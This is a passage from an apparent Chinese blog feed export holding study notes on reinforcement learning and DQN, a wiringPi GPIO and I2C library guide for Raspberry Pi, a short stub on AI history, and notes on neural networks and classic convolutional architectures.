首先是最优动作价值函数和一般的动作价值函数的关系： \begin{aligned} Q^*(s,a) &= \max_\pi Q^\pi(s,a)\\\\ & = \mathbb E_{s^\prime}[r+\lambda \max _{a^\prime}Q^*(s^\prime,a^\prime)|s,a] \end{aligned}也就是最优的动作价值函数就是所有策略下的动作价值函数的最大值。通过这样的定义就可以使最优的动作价值的唯一性，从而可以求解整个MDP。 下面介绍基于Bellman方程的两个最基本的算法，策略迭代和值迭代。 策略迭代Policy IterationPolicy Iteration的目的是通过迭代计算value function 价值函数的方式来使policy收敛到最优。 Policy Iteration本质上就是直接使用Bellman方程而得到的： \begin{aligned} v_{k+1}(s) &\overset{.}{=} \mathbb E_{\pi}[R_{t+1}+\gamma v _{k}(S_{t+1})|S_t=s]\\\\ &=\sum_{a}{\pi(a|s)}\sum_{s^\prime,r}{p(s^\prime,r|s,a)[r+\gamma v_k(s^\prime)]} \end{aligned}那么Policy Iteration一般分成两步： Policy Evaluation 策略评估。目的是更新Value Function，或者说更好的估计基于当前策略的价值 Policy Improvement 策略改进。 使用 greedy policy 产生新的样本用于第一步的策略评估。 图2 策略迭代算法示意图 本质上就是使用当前策略产生新的样本，然后使用新的样本更好的估计策略的价值，然后利用策略的价值更新策略，然后不断反复。理论可以证明最终策略将收敛到最优。 具体算法： 图3 策略迭代算法 那么这里要注意的是policy evaluation部分。这里的迭代很重要的一点是需要知道state状态转移概率p。也就是说依赖于model模型。而且按照算法要反复迭代直到收敛为止。所以一般需要做限制。比如到某一个比率或者次数就停止迭代。那么需要特别说明的是不管是策略迭代还是值迭代都是在理想化的情况下（上帝视角）推导出来的算法，本质上并不能直接应用，因为依赖Model。 Value Iteration 价值迭代Value Iteration则是使用Bellman 最优方程得到: \begin{aligned} v_{*}(s) & = \max_{a} \mathbb E_{\pi}[R_{t+1}+\gamma v _{*}(S_{t+1})|S_t=s,A_t=a]\\\\ & = \max_{a} \sum_{s^\prime,r}p(s^\prime,r|s,a)[r+\gamma v_*(s^\prime)] \end{aligned}然后改变成迭代形式: \begin{aligned} v_{k+1}(s) &\overset{.}{=} \max_{a} \mathbb E_{\pi}[R_{t+1}+\gamma v _{k}(S_{t+1})|S_t=s,A_t=a]\\\\ & = \max_{a} \sum_{s^\prime,r}p(s^\prime,r|s,a)[r+\gamma v_k(s^\prime)] \end{aligned}value iteration的算法如下： 图4 值迭代算法 Policy Iteration和Value Iteration有什么本质区别？ policy iteration使用bellman方程来更新value，最后收敛的value 即$v_\pi$是当前policy下的value值（所以叫做对policy进行评估），目的是为了后面的policy improvement得到新的policy。 而value iteration是使用bellman 最优方程来更新value，最后收敛得到的value即$v_*$就是当前state状态下的最优的value值。因此，只要最后收敛，那么最优的policy也就得到的。因此这个方法是基于更新value的，所以叫value iteration。 从上面的分析看，value iteration较之policy iteration更直接。不过问题也都是一样，需要知道状态转移函数p才能计算。本质上依赖于模型，而且理想条件下需要遍历所有的状态，这在稍微复杂一点的问题上就基本不可能了。 Q-LearningQ Learning的思想完全根据value iteration得到。但要明确一点是value iteration每次都对所有的Q值更新一遍，也就是所有的状态和动作。但事实上在实际情况下我们没办法遍历所有的状态，还有所有的动作，我们只能得到有限的系列样本。因此，只能使用有限的样本进行操作。那么，怎么处理？Q Learning提出了一种更新Q值的办法： Q(S_{t},A_{t}) \leftarrow Q(S_{t},A_{t})+\alpha({R_{t+1}+\lambda \max _aQ(S_{t+1},a)} - Q(S_t,A_t))虽然根据value iteration计算出target Q值，但是这里并没有直接将这个Q值（是估计值）直接赋予新的Q，而是采用渐进的方式类似梯度下降，朝target迈近一小步，取决于α,这就能够减少估计误差造成的影响。类似随机梯度下降，最后可以收敛到最优的Q值。 具体的算法如下： 图5 Q学习算法 Exploration and Exploitation 探索与利用回到policy的问题，那么要选择怎样的policy来生成action呢？有两种做法： 随机的生成一个动作 根据当前的Q值计算出一个最优的动作，这个policy\pi称之为greedy policy贪婪策略。也就是 \pi(S_{t+1}) = arg\max _aQ(S_{t+1},a)使用随机的动作就是exploration，也就是探索未知的动作会产生的效果，有利于更新Q值，获得更好的policy。而使用greedy policy也就是target policy则是exploitation，利用policy，这个相对来说就不好更新出更好的Q值，但可以得到更好的测试效果用于判断算法是否有效。 将两者结合起来就是所谓的$\epsilon-greedy$策略，$\epsilon$一般是一个很小的值，作为选取随机动作的概率值。可以更改$\epsilon$的值从而得到不同的exploration和exploitation的比例。 这里需要说明的一点是使用$\epsilon-greedy$策略是一种极其简单粗暴的方法，对于一些复杂的任务采用这种方法来探索未知空间是不可取的。因此，最近有越来越多的方法来改进这种探索机制。 深度强化学习深度强化学习始于DeepMind在NIPS 2013上发表的Playing Atari with Deep Reinforcement Learning一文，在该文中第一次提出Deep Reinforcement Learning 这个名称，并且提出DQN（Deep Q-Network）算法，实现从纯图像输入完全通过学习来玩Atari游戏的成果。 之后DeepMind在Nature上发表了改进版的DQN文章Human-level Control through Deep Reinforcement Learning，引起了广泛的关注，Deep Reinfocement Learning 从此成为深度学习领域的前沿研究方向。 维度灾难对简单问题可使用表格来表示Q(s,a)，但是这个在现实的很多问题上是几乎不可行的，因为状态实在是太多。使用表格的方式根本存不下。 以计算机玩Atari游戏为例，计算机玩Atari游戏的要求是输入原始图像数据，也就是210x160像素的图片，然后输出几个按键动作。总之就是和人类的要求一样，纯视觉输入，然后让计算机自己玩游戏。那么这种情况下，到底有多少种状态呢？有可能每一秒钟的状态都不一样。因为，从理论上看，如果每一个像素都有256种选择，那么就有： 256^{210\times 160}这简直是天文数字。所以，我们是不可能通过表格来存储状态的。我们有必要对状态的维度进行压缩，解决办法就是 价值函数近似Value Function Approximation 价值函数近似Value Function Approximation什么是价值函数近似呢？说起来很简单，就是用一个函数来表示Q(s,a)。即 Q(s,a) = f(s,a)$f$可以是任意类型的函数，比如线性函数： Q(s,a) = w_1s + w_2a + b其中$w_1$,$w_2$,$b$是函数$f$的参数。 通过函数表示，我们就可以无所谓s到底是多大的维度，反正最后都通过矩阵运算降维输出为单值的Q。 这就是价值函数近似的基本思路。 如果我们就用$w$来统一表示函数$f$的参数，那么就有 Q(s,a) = f(s,a,w)为什么叫近似，因为我们并不知道Q值的实际分布情况，本质上就是用一个函数来近似Q值的分布，所以，也可以说是 Q(s,a)\approx f(s,a,w)Q值神经网络化——DQN算法意思很清楚，就是我们用一个深度神经网络来表示这个函数$f$。 以DQN为例，输入是经过处理的4个连续的84x84图像，然后经过两个卷积层，两个全连接层，最后输出包含每一个动作Q值的向量。 神经网络的训练是一个最优化问题，最优化一个损失函数loss function，也就是标签和网络输出的偏差，目标是让损失函数最小化。为此，我们需要有样本，巨量的有标签数据，然后通过反向传播使用梯度下降的方法来更新神经网络的参数。 如何为Q网络提供有标签的样本？答案就是利用Q-Learning算法。目标Q值作为标签，使Q值趋近于目标Q值。于是Q网络训练的损失函数就是： 图6 DQN损失函数 上面公式是$s^\prime$, $a^\prime$即下一个状态和动作。这里用了David Silver的表示方式，看起来比较清晰。既然确定了损失函数，也就是cost，确定了获取样本的方式。那么DQN的整个算法也就成型了！ 这里分析第一个版本的DQN，也就是NIPS 2013提出的DQN。 图7 DQN算法 具体的算法主要涉及到Experience Replay，也就是经验池的技巧，就是如何存储样本及采样问题。 由于玩Atari采集的样本是一个时间序列，样本之间具有连续性，如果每次得到样本就更新Q值，受样本分布影响，效果会不好。因此，一个很直接的想法就是把样本先存起来，然后随机采样如何？这就是Experience Replay的意思。按照脑科学的观点，人的大脑也具有这样的机制，就是在回忆中学习。 那么上面的算法看起来那么长，其实就是反复试验，然后存储数据。接下来数据存到一定程度，就每次随机采用数据，进行梯度下降！ 策略梯度Policy Gradient的方法的基本思想是通过评价动作action的好坏，来调整该action的出现概率。最基本的Policy Gradient的损失函数Loss就是： loss = -log(\pi)*Q这里先以Q值来指代对动作的评价。 Robot Learning的发展路径Robot Learning从目前来看，经过了以下研究思路的发展： （1）利用传统的控制算法结合深度学习来实现机器人端到端的控制。这个方法主要是以Guided Policy Search（GPS）为首。这个方法是Sergey Levine提出的，通过与传统方法结合，确实可以让机器人学习出一些有意思的技能，但是有个根本问题摆在面前，就是传统方法通常需要知道整个系统的模型，而这在实际的机器人中非常难以适用。就比如四轴飞行器的控制，我们可以通过外部的Vicon设备来精确的定位四轴飞行器的位置，从而实现对其精确控制，但是在户外，我们根本就做不到这点，也就无法精确建模。因此，还依赖传统方法是没有出路的，我们使用深度学习就是要抛弃传统方法的弊端。 （2）深度增强学习DRL。由于DeepMind在DRL取得了巨大成功，而DRL就是面向决策与控制问题，特别适用于机器人，因此想在机器人上使用DRL是一种必然的想法。Google Brain团队（依然以Sergey Levine为首）做出了一些进展，在我们之前的专栏文章中也有分析最前沿 之 谷歌的协作机械臂 - 知乎专栏 。但是在使用DRL之后，DRL的弊端也就显现出来了，那就是需要大量的尝试来获取数据。对于这个问题，在机器人仿真环境还好，但是在真实的机器人上就根本没办法这么做了。为了解决这个问题，也就引出来下面两个研究思路。 （3）迁移学习Transfer Learning。既然在真实环境不行，而仿真环境可以，那么是不是可以先在仿真环境中训练好，再把知识迁移到真实机器人上。Google Deepmind在这一块做了一些不错的工作，提出了Progressive Neural Net和PathNet，验证了迁移的可能性。而且很显然的，仿真环境越真实，迁移效果会越好。那么，搞一个非常仿真的环境就非常有意义了。这不，Nvidia 刚刚推出Isaac机器人模拟系统，确实是对Robot Learning的研究注入了一剂强心剂。 （4）Imitation Learning 模仿学习/Few Shot Learning 少样本学习/ Meta Learning 学会学习。这是另一条思路，那就是尽量减少数据的使用量。我们如果能够教机器人几次机器人就能学会技能那么问题也能解决。而这一块也就是OpenAI (依然是Sergey Levine）那帮人在如火如荼的研究的方向。而且特别是Meta Learning，直指通用人工智能的核心。如果能够在Meta Learning上取得突破，那么本身会是革命性的。 因此，Robot Learning发展到这里，把研究的方向就聚焦到第三和第四点上了，并且也取得了一定的成果，但是显然还有非常多的工作可以去做。 参考链接 深度学习, by wikipedia. DQN 从入门到放弃1 DQN与增强学习, by Flood Sung. DQN 从入门到放弃2 增强学习与MDP, by Flood Sung. DQN 从入门到放弃3 价值函数与Bellman方程, by Flood Sung. DQN 从入门到放弃4 动态规划与Q-Learning,by Flood Sung. DQN从入门到放弃5 深度解读DQN算法, by Flood Sung. DQN从入门到放弃6 DQN的各种改进, by Flood Sung. DQN从入门到放弃7 连续控制DQN算法-NAF,by Flood Sung. 最前沿：机器人学习Robot Learning的发展,by Flood Sung. 简单的交叉熵损失函数，你真的懂了吗？,by 红色石头. Markov decision process,by wikipedia. openai spinningup,by LJ147.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[wiringPi学习笔记]]></title>
    <url>%2F2018%2F11%2F24%2FwiringPi%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[wiringPi 库是由 Gordon Henderson 所编写并维护的一个用 C 语言写成的类库。起初,主要是作为 BCM2835 芯片的 GPIO 库。而现在,已经非常丰富,除了 GPIO 库,还包括了I2C 库、SPI 库、UART 库和软件 PWM 库等。 由于其与 Arduino 的“wiring”系统较为类似,故以此命名。它是采用 GNU LGPLv3许可证的,可以在 C 或 C++上使用,而且在其他编程语言上也有对应的扩展。 wiringPi 库包含了一个命令行工具 gpio,它可以用来设置 GPIO 管脚,可以用来读写GPIO 管脚,甚至可以在 Shell 脚本中使用来达到控制 GPIO 管脚的目的。 下载、编译和测试wiringPi 下载并编译wiringPi 123git clone git://git.drogon.net/wiringPicd wiringPi./build 测试wiringPi是否安装成功打开命令终端，可以通过 gpio 命令来检查 wiringPi 是否安装成功，运行下面的命令： 12gpio –vgpio readall 运行上述第二条命令将得到树莓派的 GPIO 接口之间的对应关系。 使用wiringPi在使用wiringPi之前，应首先对wiringPi进行设置。 wiringPi设置函数wiringPi设置函数如下：1234int wiringPiSetup (void) ;int wiringPiSetupGpio (void) ;int wiringPiSetupPhys (void) ;int wiringPiSetupSys (void) ; wiringPiSetup (void) 函数该函数初始化wiringPi，假定程序将使用wiringPi的管脚定义图。具体管脚映射，可以通过gpio readall命令来查看。该函数需要root权限。 wiringPiSetupGpio (void) 函数该函数与wiringPiSetup函数类似，区别在于假定程序使用的是Broadcom的GPIO管脚定义，而没有重新映射。该函数需要root权限，需要注意v1和v2版本的树莓派是不同的。 wiringPiSetupPhys (void) 函数该函数与wiringPiSetup函数类似，区别在于允许程序使用物理管脚定义，但仅支持P1接口。该函数需要root权限。 wiringPiSetupSys (void) 函数该函数初始化wiringPi，使用/sys/class/gpio接口，而不是直接通过操作硬件来实现。该函数可以使用非root权限用户，在此种模式下的管脚号是Broadcom的GPIO管脚号，不wiringPiSetupGpio函数类似，需要注意v1和v2板子的不同。 在此种模式下，在运行程序前，您需要通过/sys/class/gpio接口导出要使用的管脚。你可以在一个独立的shell脚本中来导出将要使用的管脚，或者使用系统的system()函数来调用GPIO命令。 软件 PWM 库wiringPi 中包含了一个软件驱动的 PWM (Pulse Width Modulation, 脉冲宽度调节)处理库，可以在任意的树莓派 GPIO 上输出 PWM 信号。 但是也有一些限制。为了维护较低的 CPU 使用率，最小的脉冲宽度是 100 微秒，结合默认的建议值为 100，那么最小的 PWM 频率是 100Hz。如果需要更高的频率，可以使用更低的数值。如果看脉冲宽度的驱动代码，你会发现低于 100 微秒，wiringPi 是在软件循环中实现的，这就意味着 CPU 使用率将会动态增加，从而使得控制其他管脚成为不可能。 需要注意的是，当其他程序运行在更高的实时的优先级，Linux 可能会影响产生信号的精度。尽管有这些限制，控制 LED 或电机还是可以的。 使用前,需要包含相应的文件:12#include &lt;wiringPi.h&gt;#include &lt;softPwm.h&gt; 当编译程序时,必须加上 pthread 库,如下:1gcc –o myprog myprog.c –lwiringPi –lpthread 必须使用 wiringPiSetup()、 wiringPiSetupGpio()或者 wiringPiSetupPhys()函数来初始化 wiringPi。 wiringPiSetupSys()是不够快的，因此，必须使用 sudo 命令来运行程序。 softPwmCreate 函数该函数的原型为：int softPwmCreate(int pin, int initialValue, int pwmRange); 该函数将会创建一个软件控制的 PWM 管脚。可以使用任何一个 GPIO 管脚 , pwmRange 参数可以为 0(关)~100(全开)。 返回值为 0，代表成功，其他值，代表失败。 softPwmWrite 函数该函数的原型为: void softPwmWrite(int pin, int value); 该函数将会更新指定管脚的 PWM 值。value 参数的范围将会被检查,如果指定的管脚之前没有通过 softPwmCreate 初始化,将会被忽略。 wiringPi核心函数pinMode函数该函数的原型为: void pinMode(int pin, int mode); 使用该函数可以将某个管脚讴置为 INPUT(输入)、 OUTPUT(输出)、 PWM_OUTPUT(脉冲输出)或者 GPIO_CLOCK(GPIO 时钟)。 需要注意的是仅有管脚 1(BCM_GPIO 18)支持 PWM_OUTPUT 模式,仅有管脚 7(BCM_GPIO 4)支持 CLOCK 输出模式。 在 Sys 模式下,返个函数没有影响。你可以通过调用 gpio 命令在 shell 脚本中来设置管脚的模式。 digitalWrite 函数该函数的原型为: void digitalWrite(int pin, int value); 使用该函数可以向指定的管脚写入 HIGH(高)或者 LOW(低),写入前,需要将管脚设置为输出模式。 wiringPi 将任何的非 0 值作为 HIGH (高)来对待,因此, 0 是唯一能够代表 LOW (低)的数值。 digitalRead 函数该函数原型： digitalRead(int pin); 使用该函数可以读取指定管脚的值，读取到的值为HIGH（1）或者LOW（0），该值取决于该管脚的逻辑电平的高低。 时间函数delay 函数该函数的原型为：void delay(unsigned int howLong); 该函数将会中断程序执行至少 howLong 毫秒。因为 Linux 是多任务的原因，中断时间可能会更长。需要注意的是，最长的延迟值是一个无符号 32 位整数，其大约为 49 天。 delayMicroseconds 函数该函数的原型为：void delayMicroseconds(unsigned int howLong); 该函数将会中断程序执行至少 howLong 微秒。因为 Linux 是一个多任务的系统，因此中断时间可能会更长。需要注意的是，最长的延迟值是一个无符号 32 位整数，其大约为 71分钟。 延迟低于100 微秒，将会使用硬件循环来实现；超过 100 微秒，将会使用系统的nanosleep()函数来实现。 优先级/时间/线程wiringPiISR 函数该函数的原型为：int wiringPiISR(int pin, int edgeType, void (*function)(void)); 该函数会在指定管脚注册一个中断事件的函数，当指定管脚发生中断事件时，会自动调用该函数。 edgeType 参数可以为 INT_EDGE_FALLING（下降沿）、INT_EDGE_RISING（上升沿）、INT_EDGE_BOTH（上升沿或者下降沿）或者 INT_EDGE_SETUP。如果是INT_EDGE_SETUP，将不会初始化该管脚，因为它假定已经在别处设置过该管脚（比如使用 gpio 命令），但是，如果指定另外的类型，指定管脚将会被导出并初始化。完成此操作使用的是 gpio 命令，所以，必须保证 gpio 命令是可用的。 注册函数在中断触发时，将会被调用。在调用注册函数前，中断事件将会从分配器中清除，所以，即使有后续的触发发生，在处理完成前，也不会错过此次触发。（当然，如果在正在处理触发时，有不止一个的中断发生，已经发生的中断将会被忽略）。 I2C库wiringPi 包含了一个 I2C 库，来让您能够更轻松的使用树莓派的板上 I2C 接口。在使用 I2C 接口之前，您可能需要使用 gpio 命令来加载 I2C 驱劢到内核中：1gpio load i2c 如果你需要的波特率是 100Kbps，那么您可以使用如下命令设置波特率为1000Kbps：1gpio load i2c 1000 使用 I2C 库，需要包含 wiringPiI2C.h 文件。并且编译时，同样需要使用-lwiringPi 来连接到 wiringPi 库。 您仍然可以使用标准的系统命令来检测 I2C 设备，如 i2cdetect 命令，需要注意的是，在 v1 版本的树莓派上是 0，v2 版本上是 1，如下： 123ls /dev/i2c-1# 注意i2c-1后面的编码1i2cdetect –y 1 当然，您也可以使用 gpio 命令来调用 i2cdetect 命令，从而检测 I2C 讴备，返样就不用在乎您的树莓派版本了，如下：1gpio i2cdetect wiringPiI2CSetup 函数该函数的原型为：int wiringPiI2CSetup(int devId); 该函数使用指定设备标示号来初始化 I2C 系统。参数 devId 是 I2C 设备的地址，可以通过 i2cdetect 命令可以查到该地址。该函数会获取树莓派的版本并依据此打开/dev 目录下对应的讴备。 返回值是标准的 Linux 文件句柄，如果有错误，则返回-1。 比如，流行的 MCP23017 GPIO 扩展器的设备 ID 是 0x20，所以，你需要将这个数值传递给 wiringPiI2CSetup()。 wiringPiI2CWrite 函数该函数的原型为：int wiringPiI2CWrite(int fd, int data)； 简单的设备写操作。一些设备可以接受数据，而不需要发送任何内部寄存器地址。 wiringPiI2CRead 函数该函数的原型为：int wiringPiI2CRead(int fd)； 简单的设备读操作。一些设备可以直接读取，而不需要发送任何寄存器地址。 wiringPiI2CWriteReg8 和 wiringPiI2CWriteReg16 函数该函数的原型为： int wiringPiI2CWriteReg8(int fd, int reg, int data); int wiringPiI2CWriteReg16(int fd, int reg, int data); 使用返两个函数，可以写一个 8 位或 16 位数值到指定的设备寄存器。 wiringPiI2CReadReg8 和 wiringPiI2CReadReg16 函数该函数的原型为： int wiringPiI2CReadReg8(int fd, int reg); int wiringPiI2CReadReg16(int fd, int reg); 使用返两个函数，可以从指定的设备寄存器读取一个 8 位或 16 位的数值。 参考链接 树莓派 wiringPi 用户手册 , by 科技爱好者博客 Wiring Pi Pthreads 入门教程,by hanbingyan.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[人工智能——人类科技再次飞跃的门槛]]></title>
    <url>%2F2018%2F11%2F21%2F%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E2%80%94%E2%80%94%E4%BA%BA%E7%B1%BB%E7%A7%91%E6%8A%80%E5%86%8D%E6%AC%A1%E9%A3%9E%E8%B7%83%E7%9A%84%E9%97%A8%E6%A7%9B%2F</url>
    <content type="text"><![CDATA[人工智能的研究历史有着一条从以“推理”为重点，到以“知识”为重点，再到以“学习”为重点的自然、清晰的脉络。机器学习则是实现人工智能的一个途径，即以机器学习为手段解决人工智能中的问题。 问题的提出问题的分析解决方案总结参考文献 机器学习, by wikipedia.]]></content>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机器学习之神经网络]]></title>
    <url>%2F2018%2F11%2F20%2F%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%2F</url>
    <content type="text"><![CDATA[人工神经网络（英语：Artificial Neural Network，ANN），简称神经网络（Neural Network，NN）或类神经网络，在机器学习和认知科学领域，是一种模仿生物神经网络（动物的中枢神经系统，特别是大脑）的结构和功能的数学模型或计算模型，用于对函数进行估计或近似。 神经网络由大量的人工神经元联结进行计算。大多数情况下人工神经网络能在外界信息的基础上改变内部结构，是一种自适应系统，通俗的讲就是具备学习功能。现代神经网络是一种非线性统计性数据建模工具。 神经元神经元示意图： 图1 神经元示意图 a1~an为输入向量的各个分量 w1~wn为神经元各个突触的权值 b为偏置 f为传递函数，通常为非线性函数。一般有Sigmoid(), ReLU(), Softmax()。 t为神经元输出 神经元的数学表示是：$t=f(\vec{W^{‘}}\vec{A}+b)$ $\vec{W}$为权向量，$\vec{W^{‘}}$为$\vec{W}$的转置 $\vec{A}$为输入向量 $b$为偏置 $f$为传递函数 可见，一个神经元的功能是求得输入向量与权向量的内积后，经一个非线性传递函数得到一个标量结果。 激活函数 Sigmoid函数 Sigmoid函数也称S型激活函数，其将加权和转换为介于 0 和 1 之间的值。 F(x)=\frac{1} {1+e^{-x}}曲线图如下： 图2 S 型激活函数 ReLU函数 相较于 S 型函数等平滑函数，以下修正线性单元激活函数（简称为 ReLU）的效果通常要好一点，同时还非常易于计算。 F(x)=max(0,x)ReLU 的优势在于它基于实证发现（可能由 ReLU 驱动），拥有更实用的响应范围。S 型函数的响应性在两端相对较快地减少。 图3 ReLU 激活函数 Softmax函数 Softmax函数用于多类别神经网络。在多类别问题中，Softmax 会为每个类别分配一个用小数表示的概率。这些用小数表示的概率相加之和必须是 1.0。 Softmax 方程式如下所示： p(y = j|\textbf{x}) = \frac{e^{(\textbf{w}_j^{T}\textbf{x} + b_j)}}{\sum_{k\in K} {e^{(\textbf{w}_k^{T}\textbf{x} + b_k)}} }请注意，此公式本质上是将逻辑回归公式延伸到了多类别。 Softmax 层是紧挨着输出层之前的神经网络层。Softmax 层必须和输出层拥有一样的节点数。 图4 神经网络中的 Softmax 层 神经元网络神经元网络可分为单层神经元网络和多层神经元网络。而常用的是多层神经元网络。 多层神经元网络一种常见的多层结构的前馈网络（Multilayer Feedforward Network）由三部分组成，如图2所示： 图5 包含激活函数的三层模型的图表 输入层（Input layer），众多神经元（Neuron）接受大量非线形输入消息。输入的消息称为输入向量。 输出层（Output layer），消息在神经元链接中传输、分析、权衡，形成输出结果。输出的消息称为输出向量。 隐藏层（Hidden layer），简称“隐层”，是输入层和输出层之间众多神经元和链接组成的各个层面。隐层可以有一层或多层。隐层的节点（神经元）数目不定，但数目越多神经网络的非线性越显著，从而神经网络的强健性（robustness）（控制系统在一定结构、大小等的参数摄动下，维持某些性能的特性）更显著。习惯上会选输入节点1.2至1.5倍的节点。 这种网络一般称为感知器（对单隐藏层）或多层感知器（对多隐藏层），神经网络的类型已经演变出很多种，这种分层的结构也并不是对所有的神经网络都适用。 训练神经网络通常使用反向传播算法训练神经网络[3]，但一些常见情况都会导致反向传播算法出错。 梯度消失 较低层（更接近输入）的梯度可能会变得非常小。在深度网络中，计算这些梯度时，可能涉及许多小项的乘积。 当较低层的梯度逐渐消失到 0 时，这些层的训练速度会非常缓慢，甚至不再训练。 ReLU 激活函数有助于防止梯度消失。 梯度爆炸 如果网络中的权重过大，则较低层的梯度会涉及许多大项的乘积。在这种情况下，梯度就会爆炸：梯度过大导致难以收敛。 批标准化可以降低学习速率，因而有助于防止梯度爆炸。 ReLU 单元消失 一旦 ReLU 单元的加权和低于 0，ReLU 单元就可能会停滞。它会输出对网络输出没有任何贡献的 0 激活，而梯度在反向传播算法期间将无法再从中流过。由于梯度的来源被切断，ReLU 的输入可能无法作出足够的改变来使加权和恢复到 0 以上。 降低学习速率有助于防止 ReLU 单元消失。 丢弃正则化 这是称为丢弃的另一种形式的正则化，可用于神经网络。其工作原理是，在梯度下降法的每一步中随机丢弃一些网络单元。丢弃得越多，正则化效果就越强。 卷积神经网络卷积神经⽹络（convolutional neural network）是含有卷积层（convolutional layer）的神经⽹络。下面将按时间顺序介绍各类经典的卷积神经网络。 卷积神经⽹络（LeNet）LeNet是⼀个早期⽤来识别⼿写数字图像的卷积神经⽹络，于80 年代末期提出。这个名字来源于LeNet论⽂的第⼀作者Yann LeCun。LeNet展⽰了通过梯度下降训练卷积神经⽹络可以达到⼿写数字识别在当时最先进的结果。这个奠基性的⼯作第⼀次将卷积神经⽹络推上舞台，为世⼈所知。 LeNet结构LeNet一共有7层（不包括输入层），可分为卷积层块和全连接层块两个部分，如图6所示。 图6 LeNet结构 输入层：输入图像的大小为32*32，这要比mnist数据库中的最大字母（28*28）还大。作用： 图像较大，这样做的目的是希望潜在的明显特征，比如笔画断续，角点等能够出现在最高层特征监测子感受野的中心。 卷积层：C1，C3，C5为卷积层，S2，S4为降采样层。 全连接层：F6为全连接层，还有一个输出层。 深度卷积神经⽹络（AlexNet）2012年，AlexNet横空出世。这个模型的名字来源于论⽂第⼀作者的姓名Alex Krizhevsky。AlexNet使⽤了8层卷积神经⽹络，并以很⼤的优势赢得了ImageNet 2012图像识别挑战赛。它⾸次证明了学习到的特征可以超越⼿⼯设计的特征，从而⼀举打破计算机视觉研究的前状。 AlexNet与LeNet区别AlexNet与LeNet的设计理念⾮常相似，但也有显著的区别。 第⼀，与相对较小的LeNet相⽐，AlexNet包含8层变换，其中有5层卷积和2层全连接隐藏层，以及1个全连接输出层。 第⼆，AlexNet将sigmoid激活函数改成了更加简单的ReLU激活函数。 第三，AlexNet通过丢弃法来控制全连接层的模型复杂度。 第四，AlexNet引⼊了⼤量的图像增⼴，如翻转、裁剪和颜⾊变化，从而进⼀步扩⼤数据集来缓解过拟合。 AlexNet结构AlexNet的一些参数和结构图： 卷积层：5层 全连接层：3层 深度：8层 参数个数：60M 神经元个数：650k 分类数目：1000类 图7 AlexNet结构 由于当时的显卡容量问题，AlexNet 的60M个参数无法全部放在一张显卡上操作，所以采用了两张显卡分开操作的形式，其中在C3，R1，R2，R3层上出现交互，所谓的交互就是通道的合并，是一种串接操作。 使⽤重复元素的⽹络（VGG网络）VGG的名字来源于论⽂作者所在的实验室Visual Geometry Group。2014年VGG提出了可以通过重复使⽤简单的基础块来构建深度模型的思路。 VGG块的组成规律是：连续使⽤数个相同的填充为1、窗口形状为3*3的卷积层后接上⼀个步幅为2、窗口形状为2*2的最⼤池化层。卷积层保持输⼊的⾼和宽不变，而池化层则对其减半。 VGG相比AlexNet的一个改进是采用连续的几个3x3的卷积核代替AlexNet中的较大卷积核（11x11，7x7，5x5）。对于给定的感受野（与输出有关的输入图片的局部大小），采用堆积的小卷积核是优于采用大的卷积核，因为多层非线性层可以增加网络深度来保证学习更复杂的模式，而且代价还比较小（参数更少）。 与AlexNet和LeNet⼀样，VGG⽹络由卷积层模块后接全连接层模块构成。卷积层模块串联数个vgg_block，其超参数由变量conv_arch定义。该变量指定了每个VGG块⾥卷积层个数和输出通道数。全连接模块则跟AlexNet中的⼀样。 构造⼀个最简单的VGG⽹络VGG-11。它有5个卷积块，前2块使⽤单卷积层，而后3块使⽤双卷积层。第⼀块的输出通道是64，之后每次对输出通道数翻倍，直到变为512。 图8 VGG结构 ⽹络中的⽹络（NiN）在AlexNet问世不久，⽹络中的⽹络（NiN）提出即串联多个由卷积层和“全连接”层构成的小⽹络来构建⼀个深层⽹络。 卷积层的输⼊和输出通常是四维数组（样本，通道，⾼，宽），而全连接层的输⼊和输出则通常是⼆维数组（样本，特征）。如果想在全连接层后再接上卷积层，则需要将全连接层的输出变换为四维。1*1卷积层可以看成全连接层中空间维度（⾼和宽）上的每个元素相当于样本，通道相当于特征。因此， NiN使⽤1*1卷积层来替代全连接层，从而使空间信息能够⾃然传递到后⾯的层中去。 NiN结构（右边）与AlexNet、VGG（左边）的区别： 图9 NiN与VGG区别 NiN块是NiN中的基础块。它由⼀个卷积层加两个充当全连接层的1 * 1卷积层串联而成。其中第⼀个卷积层的超参数可以⾃⾏设置，而第⼆和第三个卷积层的超参数⼀般是固定的。 NiN重复使⽤由卷积层和代替全连接层的1 * 1卷积层构成的NiN块来构建深层⽹络。NiN去除了容易造成过拟合的全连接输出层，而是将其替换成输出通道数等于标签类别数的NiN块和全局平均池化层。 含并⾏连结的⽹络（GoogLeNet）在2014年的ImageNet图像识别挑战赛中，⼀个名叫GoogLeNet的⽹络结构⼤放异彩。它虽然在名字上向LeNet致敬，但在⽹络结构上已经很难看到LeNet的影⼦。GoogLeNet吸收了NiN中⽹络串联⽹络的思想，并在此基础上做了很⼤改进。 GoogLeNet中的基础卷积块叫作Inception块，得名于同名电影《盗梦空间》（Inception）。与NiN块相⽐，这个基础块在结构上更加复杂，如图所⽰。 图10 Inception块结构 Inception块⾥有4条并⾏的线路。前3条线路使⽤窗口⼤小分别是1 * 1、3 * 3和5 * 5的卷积层来抽取不同空间尺⼨下的信息，其中中间2个线路会对输⼊先做1 * 1卷积来减少输⼊通道数，以降低模型复杂度。第四条线路则使⽤3*3最⼤池化层，后接1*1卷积层来改变通道数。4条线路都使⽤了合适的填充来使输⼊与输出的⾼和宽⼀致。最后我们将每条线路的输出在通道维上连结，并输⼊接下来的层中去。 Inception块中可以⾃定义的超参数是每个层的输出通道数，以此来控制模型复杂度。 GoogLeNet跟VGG⼀样，在主体卷积部分中使⽤5个模块（block），每个模块之间使⽤步幅为2的3*3最⼤池化层来减小输出⾼宽。 